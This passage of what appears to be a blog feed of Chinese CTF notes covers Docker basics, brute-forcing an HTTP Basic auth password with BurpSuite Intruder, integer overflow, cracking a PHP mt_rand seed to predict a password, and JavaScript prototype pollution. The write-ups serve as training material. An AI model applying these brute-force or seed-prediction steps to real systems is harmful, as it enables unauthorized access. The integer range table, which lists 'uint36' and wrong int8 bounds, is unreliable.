进行交互</td></tr></tbody></table></div><p>当出现 <code>root@1bc08b56d08f:/#</code> 之后，就进入了 <code>ubuntu 17.10</code> 系统的容器</p><p>我们可以在 <code>root@1bc08b56d08f:/#</code> 之后输入一些 <a href="https://twle.cn/l/yufei/man/man-basic-index.html">Linux 命令</a> ，比如使用 <code>cat /proc/version</code> 和 <code>ls</code> 分别查看当前系统的版本信息和当前目录下的文件列表</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="number">1</span>bc08b56d08f:/# cat /<span class="keyword">proc</span>/version<span class="title"></span></span><br><span class="line"><span class="title">Linux</span> version 4.9.87-linuxkit-aufs (root@95fa5ec30613) (gcc<span class="title"> version</span> 6.4.0 (Alpine 6.4.0) ) #1<span class="title"> SMP</span> Wed<span class="title"> Mar</span> 14 15:12:16<span class="title"> UTC</span> 2018<span class="title"></span></span><br><span class="line"><span class="title">root@1bc08b56d08f:/#</span> ls<span class="title"></span></span><br><span class="line"><span class="title">bin</span> <span class="title"> boot</span> <span class="title"> dev</span> <span class="title"> etc</span> <span class="title"> home</span> <span class="title"> lib</span> <span class="title"> lib64</span> <span class="title"> media</span> <span class="title"> mnt</span> <span class="title"> opt</span> <span class="title"> proc</span> <span class="title"> root</span> <span class="title"> run</span> <span class="title"> sbin</span> <span class="title"> srv</span> <span class="title"> sys</span> <span class="title"> tmp</span> <span class="title"> usr</span> <span class="title"> var</span></span><br></pre></td></tr></table></figure><p>如果要推出交互式容器，可以运行 <code>exit</code> 命令或者使用 <code>CTRL+D</code> 组合键</p><h2 id="后台模式"><a href="#后台模式" class="headerlink" title="后台模式"></a>后台模式</h2><p>跟所有的 <code>Linux</code> 应用程序一样，如果不使用后台模式，那么它们一直会独占 <strong>终端</strong>，如果退出了终端，那么容器就会自动退出</p><p>所以，一般情况下我们都希望使用后台模式运行一个容器，可以添加 <code>-d</code> 参数</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="title">@localhost</span> ~]# docker run -d ubuntu:<span class="number">17.10</span> /bin/sh -<span class="keyword">c</span> <span class="string">&quot;while true; do echo hello world; sleep 1; done&quot;</span></span><br><span class="line"><span class="number">4558</span>b<span class="number">3</span>b<span class="number">54</span>da<span class="number">0</span>ff<span class="number">34</span>fa<span class="number">4</span><span class="keyword">c</span><span class="number">4</span>bc<span class="number">6</span>fb<span class="number">2</span><span class="keyword">c</span><span class="number">3303</span>b<span class="number">2</span>b<span class="number">3</span>f<span class="number">602</span>fad<span class="number">046</span>b<span class="number">205</span>b<span class="number">342</span>b<span class="number">9</span>babc<span class="number">21</span>d<span class="number">6</span></span><br></pre></td></tr></table></figure><p>使用后台模式，日志就不会输出到标准输出了，也就是不会显示在 <strong>终端</strong> 上了</p><p>这时候显示出来的，当前容器的 ID。</p><p>每个容器的 ID 都是唯一的，我们可以通过容器的 ID 来查看容器的状态和容器的所有信息</p><h2 id="查看容器运行状况"><a href="#查看容器运行状况" class="headerlink" title="查看容器运行状况"></a>查看容器运行状况</h2><p>如果想要查看容器的运行状况，可以使用 <code>docker ps</code> 命令</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID  IMAGE        <span class="string">...</span>  STATUS        <span class="string">...</span></span><br><span class="line">4558b3b54da0  ubuntu<span class="function">:17.10</span> <span class="string">...</span>  Up 2 minutes  <span class="string">...</span></span><br></pre></td></tr></table></figure><p><code>docker ps</code> 命令只会显示所有正在运行的容器</p><p>如果想要查看所有的容器，那么需要添加 <code>-a</code> 参数</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID  <span class="string">...</span>  STATUS                    <span class="string">...</span></span><br><span class="line">4558b3b54da0  <span class="string">...</span>  Up 2 minutes              <span class="string">...</span></span><br><span class="line">e08201b591<span class="keyword">cd</span>  <span class="string">...</span>  Exited <span class="params">(0)</span> 15 minutes ago <span class="string">...</span></span><br><span class="line">6801e4604a32  <span class="string">...</span>  Exited <span class="params">(0)</span> 15 minutes ago <span class="string">...</span></span><br></pre></td></tr></table></figure><p>更多 <code>docker ps</code> 命令使用方法，可以访问 <a href="https://twle.cn/l/yufei/docker/docker-basic-ps-command.html">docker ps 命令</a></p><h2 id="查看容器的运行日志"><a href="#查看容器的运行日志" class="headerlink" title="查看容器的运行日志"></a>查看容器的运行日志</h2><p>后台容器的输出不会显示在 <strong>终端</strong> 上，而是被 <code>Docker</code> 收集起来了</p><p>我们可以通过 <code>docker logs</code> 命令查看容器的日志</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs <span class="tag">&lt;<span class="name">container_id</span>&gt;</span></span><br></pre></td></tr></table></figure><p>例如想要查看容器 <code>4558b3b54da0</code> 的日志，可以使用下面的命令</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># docker logs 4558b3b54da0</span></span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>更多 <code>docker logs</code> 命令使用方法，可以访问 <a href="https://twle.cn/l/yufei/docker/docker-basic-logs-command.html">docker logs 命令</a></p><h2 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h2><p>如果想要主动停止容器，可以使用 <code>docker stop</code> 命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">stop</span> <span class="symbol">&lt;container_id&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以使用下面的命令来停止容器 <code>4558b3b54da0</code></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># docker stop 4558b3b54da0</span></span><br><span class="line"><span class="number">4558</span>b3b54da0</span><br></pre></td></tr></table></figure><p><code>docker stop</code> 命令的返回值是停止的容器 ID</p><p>现在通过 <code>docker ps -a</code> 查看，容器已经停止工作</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID  <span class="string">...</span> STATUS                     <span class="string">...</span></span><br><span class="line">6801e4604a32  <span class="string">...</span> Exited <span class="params">(0)</span> 15 minutes ago  <span class="string">...</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">🥧Docker run 运行镜像</summary>
    
    
    
    <category term="CTF" scheme="https://example.com/categories/CTF/"/>
    
    
    <category term="其他姿势" scheme="https://example.com/tags/%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>账户密码登录爆破实例</title>
    <link href="https://example.com/posts/2efbb28.html"/>
    <id>https://example.com/posts/2efbb28.html</id>
    <published>2024-12-01T15:09:25.706Z</published>
    <updated>2024-12-01T16:06:22.819Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础认证："><a href="#基础认证：" class="headerlink" title="基础认证："></a>基础认证：</h2><p>在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。</p><blockquote><p>考点：http基础认证，脚本编写，爆破</p><p>访问 /flag 发现需要登录</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d3CuuayvCVYewwJQZ9CKq7.png" alt="img"></p><p>挂上 BurpSuite 的代理，随便输个账号密码（比如: 账号aaa 密码 bbb）访问，查看 HTTP 响应报文：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/mHCcfHrFbZ1EsLnRF4S6oD.png" alt="img"></p><p>得到提示 <code>do u konw admin ?</code>，于是猜测账号是 <code>admin</code> , 那么接下来就只需要爆破密码了</p><p>注意看到 HTTP 请求头部的 Authorization 字段:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Basic <span class="attribute">YWFhOmJiYg</span>==</span><br></pre></td></tr></table></figure><p>Basic 表示是「基础认证」, 后面的 <code>YWFhOmJiYg==</code> 用 <code>base64</code> 解码后是 <code>aaa:bbb</code> , 也就是我们之前输入的 <code>账号:密码</code></p><p>使用 BurpSuite 进行基础认证爆破</p><ol><li>将报文发送到 <code>Intruder</code>, 将 <code>Basic</code> 后面 <code>base64</code> 部分添加为 <code>payload position</code></li></ol><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/iWZSTz79F5B6xjgc1fZjaF.png" alt="img"></p><ol><li><p>在 <code>Payloads</code> 选项卡下，选择 <code>Payload Type</code> 为 <code>SimpleList</code>, 然后在 <code>Payload Options</code> 中点击 <code>load</code> 加载密码字典</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/v7ZFtURkVZRWNNfSx7ANgv.png" alt=""></p></li></ol><p>Payload Processing<code>-&gt;</code>Add<code>-&gt;</code>Add Prefix<code>（添加前缀）-&gt; 输入</code>admin:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/rK5WUQBdKtDMC3Lb8em6Z9.png" alt="img"></p><p>Payload Processing<code>-&gt;</code>Add<code>-&gt;</code>Encode`（添加一个编码方式）-&gt; 选择 Base64 Encode</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/jZocPqp6oAHwpyq9Fq3tgq.png" alt="img"></p><p>Payload Encode<code>取消勾选的</code>URL-encode<code>, 不然你会看到 base64 之后的</code>=<code>会被转成</code>%3d` ，你就算爆破到天荒地老也不会出来</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7CYo3PHXcLpw8v3ivPFapV.png" alt="img"></p><p>Start Attack<code>，然后按</code>Status` 排序，看到状态码出现 200 的，即爆破成功</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/q8WhTrUghWgAw6sTZai7bj.png" alt="img"></p><p>查看 <code>Response</code> 得到 flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6xbDwpZGbWbiysF2r1xcYU.png" alt="img"></p>]]></content>
    
    
    <summary type="html">🥧账户密码登录爆破实例</summary>
    
    
    
    <category term="CTF" scheme="https://example.com/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://example.com/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>整数溢出</title>
    <link href="https://example.com/posts/704e6497.html"/>
    <id>https://example.com/posts/704e6497.html</id>
    <published>2024-12-01T15:09:25.704Z</published>
    <updated>2024-12-01T16:06:22.816Z</updated>
    
    <content type="html"><![CDATA[<p>整数溢出的原理：</p><p>1.整数类型限制：<br>在计算机中，整数类型（如 int, short, long 等）都有固定的位宽（如 8 位、16 位、32 位、64 位等），这些位宽决定了整数能表示的最大值和最小值。<br>例如，对于一个 32 位有符号整数，其取值范围是 -2,147,483,648 到 2,147,483,647。</p><ol><li><p>溢出情况：<br> 1.正溢出：当结果值超过最大正整数时，会发生正溢出。例如，在 32 位有符号整数中，2,147,483,647 + 1 会导致结果变为 -2,147,483,648（环绕回最小      负数）。<br> 2.负溢出：当结果值低于最小负整数时，会发生负溢出。例如，在 32 位有符号整数中，-2,147,483,648 - 1 会导致结果变为 2,147,483,647（环绕回最大正数）。</p></li><li><p>操作示例：<br>假设我们有一个 8 位有符号整数，范围是 -128 到 127。<br>如果我们执行 127 + 1，结果应该是 128，但超出了 8 位整数的范围，因此实际结果会变为 -128（即发生正溢出）。<br>类似地，如果执行 -128 - 1，结果应该是 -129，但同样超出了范围，因此实际结果会变为 127（即发生负溢出）。</p></li></ol><p>各种数据类型对应的取值范围：</p><p>uint8 - 0-255<br>uint16 - 0-65535<br>uint32 - 0-4294967295<br>uint36 - 0-18446744073709551615<br>int8 - -127-128<br>int16 - -32768-32767<br>int32 - -2147483648-2147483647<br>int64 - -9223372036854775808-9223372036854775807 </p>]]></content>
    
    
    <summary type="html">🥧整数溢出</summary>
    
    
    
    <category term="CTF" scheme="https://example.com/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://example.com/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>随机数种子爆破</title>
    <link href="https://example.com/posts/b4b5a295.html"/>
    <id>https://example.com/posts/b4b5a295.html</id>
    <published>2024-12-01T15:08:53.045Z</published>
    <updated>2024-12-01T16:06:22.821Z</updated>
    
    <content type="html"><![CDATA[<h2 id="随机数种子爆破"><a href="#随机数种子爆破" class="headerlink" title="随机数种子爆破"></a>随机数种子爆破</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165931510.png" alt="image-20241116165931510"></p><p>在PHP中，变量以$符号开头，后面拼接变量名。上述代码的基本 含义是:从$str变量中随机取32次字符(字符可重复)，并拼接成字符 串，最后将该字符串赋值给变量$password。执行代码后会输出 $password变量的前10个字节，此时通过POST请求传递password参数到 服务端，如果password参数的值与$password变量的值完全相等，那么 就会输出flag。</p><p>理论上，如果选取字符的时候是完全随机的，那么几乎不可能出现 password参数值与$password变量值相等的情况(概率极低)。但由于 代码中使用mt_rand()函数来生成随机数，因此如果可以得知该函数生 成的一段随机数序列，就可以通过工具爆破出其选取的随机数种子 (该种子由$_Session[‘seed’]变量生成)，从而预测之后的所有随机数序 列。在这里，我们使用php_mt_seed工具来爆破随机数种子。该工具的 下载地址为:<a href="https://www.openwall.com/php_mt_seed/php_mt_seed-">https://www.openwall.com/php_mt_seed/php_mt_seed-</a> 4.0.tar.gz</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165647076.png" alt="image-20241116165647076"></p><p>访问题目页面，可得到前10个字节的随机字符，将输出的随机字符转换为php_mt_seed可识别的数据格式。使用</p><p>Python3脚本进行转换:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165703575.png" alt="image-20241116165703575"></p><p>str1变量的值就是PHP代码中的$str的值，str2变量的值就是PHP代码中 输出的$password的前10个字节。这段代码的基本作用就是将$password 中的前10个字节(即变量str2)进行定位，得到其在str1中的具体下标 位置，然后按照具体格式输出。以str2中的第一个字母A为例，字母A 在变量str1中的下标是36(字符串下标从0开始)</p><p>将输出的字符输入到编译好的php_mt_seed工具中，具体指令如下:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165734372.png" alt="image-20241116165734372"></p><p>最终我们找到一个随机数种子 19290735(PHP7.1)。在这一步需要注意的是，mt_rand()函数本身确 实存在问题，但是根据PHP版本的不同，其生成的随机数会略有区别。 所以，在实际题目中一定要注意PHP版本问题，不能脱离PHP版本来做 题。</p><p>利用得到的随机数种子编写PHP脚本，如下所示:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165751773.png" alt="image-20241116165751773"></p><p>尝试将该结果提交给服务端，即可成功得到flag。</p><p>本质上是因为mt_rand()函数的不安全性导致的。所以，我们需要明确 以下几点:</p><p>1) mt_rand()函数的不安全性是考点的核心。 </p><p>2)要爆破随机数种子，首先需要得到mt_rand()函数生成的随机数序</p><p>列。</p><p>3)mt_rand()函数生成的随机数序列可能以不同的形式表现(例如生成 随机字符串)。</p><p>4)相同函数在不同的PHP版本(大版本)中的实现代码可能是不一样 的。例如，在PHP7和PHP5中，mt_rand()函数的实现算法是完全不同 的。</p><p>5)计算机中不存在真正的随机数，这是mt_rand()函数存在安全问题的 根本原因。</p>]]></content>
    
    
    <summary type="html">🥧随机数种子爆破</summary>
    
    
    
    <category term="CTF" scheme="https://example.com/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://example.com/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>深入理解 JavaScript Prototype 污染攻击</title>
    <link href="https://example.com/posts/575ed4b2.html"/>
    <id>https://example.com/posts/575ed4b2.html</id>
    <published>2024-12-01T15:08:33.642Z</published>
    <updated>2024-12-01T16:06:22.818Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深入理解-JavaScript-Prototype-污染攻击"><a href="#深入理解-JavaScript-Prototype-污染攻击" class="headerlink" title="深入理解 JavaScript Prototype 污染攻击"></a>深入理解 JavaScript Prototype 污染攻击</h1><h2 id="1、prototype和-proto-分别是什么？"><a href="#1、prototype和-proto-分别是什么？" class="headerlink" title="1、prototype和__proto__分别是什么？"></a>1、<code>prototype</code>和<code>__proto__</code>分别是什么？</h2><p>JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.bar = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Foo()</span><br></pre></td></tr></table></figure><p><code>Foo</code>函数的内容，就是<code>Foo</code>类的构造函数，而<code>this.bar</code>就是<code>Foo</code>类的一个属性。</p><blockquote><p>为了简化编写JavaScript代码，ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个语法糖。</p></blockquote><p>一个类必然有一些方法，类似属性<code>this.bar</code>，我们也可以将方法定义在构造函数内部：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">show</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Foo</span>()).<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure><p>但这样写有一个问题，就是每当我们新建一个Foo对象时，<code>this.show = function...</code>就会执行一次，这个<code>show</code>方法实际上是绑定在对象上的，而不是绑定在“类”中。</p><p>我希望在创建类的时候只创建一次<code>show</code>方法，这时候就则需要使用原型（prototype）了：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line">foo.<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/46109c07-bfa1-4b92-93a2-d86049274035.png"><img src="https://www.leavesongs.com/media/attachment/2019/04/03/46109c07-bfa1-4b92-93a2-d86049274035.0dcd4f4c4400.png" alt="image.png"></a></p><p>我们可以认为原型<code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法。</p><p>我们可以通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但<code>Foo</code>实例化出来的对象，是不能通过prototype访问原型的。这时候，就该<code>__proto__</code>登场了。</p><p>一个Foo类实例化出来的foo对象，可以通过<code>foo.__proto__</code>属性来访问Foo类的原型，也就是说：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.__proto__ <span class="operator">=</span><span class="operator">=</span> Foo.prototype</span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/3c4ed224-ae7b-4c8c-b16d-12b56524efee.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3c4ed224-ae7b-4c8c-b16d-12b56524efee.e270c75493b0.png" alt="image.png"></a></p><p>所以，总结一下：</p><ol><li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li><li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li></ol><h2 id="0x02-JavaScript原型链继承"><a href="#0x02-JavaScript原型链继承" class="headerlink" title="0x02 JavaScript原型链继承"></a><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">0x02 JavaScript原型链继承</a></h2><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p><p>比如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure><p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code>。</p><p>总结一下，对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p><ol><li>在对象son中寻找last_name</li><li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li><li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li><li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li></ol><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/08c5d5d0-62da-40f9-9e2c-77831fa7488e.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/08c5d5d0-62da-40f9-9e2c-77831fa7488e.51324dd04eef.png" alt="image.png"></a></p><p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p><p>以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：</p><ol><li>每个构造函数(constructor)都有一个原型对象(prototype)</li><li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li><li>JavaScript使用prototype链实现继承机制</li></ol><h2 id="0x03-原型链污染是什么"><a href="#0x03-原型链污染是什么" class="headerlink" title="0x03 原型链污染是什么"></a><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x03">0x03 原型链污染是什么</a></h2><p>第一章中说到，<code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果我们修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？</p><p>做个简单的实验：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line">let foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.__proto__.bar = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line">let zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(zoo.bar)</span><br></pre></td></tr></table></figure><p>最后，虽然zoo是一个<strong>空</strong>对象<code>&#123;&#125;</code>，但<code>zoo.bar</code>的结果居然是2：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/4b63f1ef-6ed8-4448-9644-f11620822aaf.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4b63f1ef-6ed8-4448-9644-f11620822aaf.2b2425c31fdb.png" alt="image.png"></a></p><p>原因也显而易见：因为前面我们修改了foo的原型<code>foo.__proto__.bar = 2</code>，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p><p>后来，我们又用Object类创建了一个zoo对象<code>let zoo = &#123;&#125;</code>，zoo对象自然也有一个bar属性了。</p><p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p><h2 id="0x04-哪些情况下原型链会被污染？"><a href="#0x04-哪些情况下原型链会被污染？" class="headerlink" title="0x04 哪些情况下原型链会被污染？"></a><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x04">0x04 哪些情况下原型链会被污染？</a></h2><p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p><p>我们思考一下，哪些情况下我们可以设置<code>__proto__</code>的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：</p><ul><li>对象merge</li><li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li></ul><p>以对象merge为例，我们想象一个简单的merge函数：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function <span class="keyword">merge</span>(target, source) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> <span class="keyword">key</span> <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">key</span> <span class="keyword">in</span> source &amp;&amp; <span class="keyword">key</span> <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="keyword">merge</span>(target[<span class="keyword">key</span>], source[<span class="keyword">key</span>])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[<span class="keyword">key</span>] = source[<span 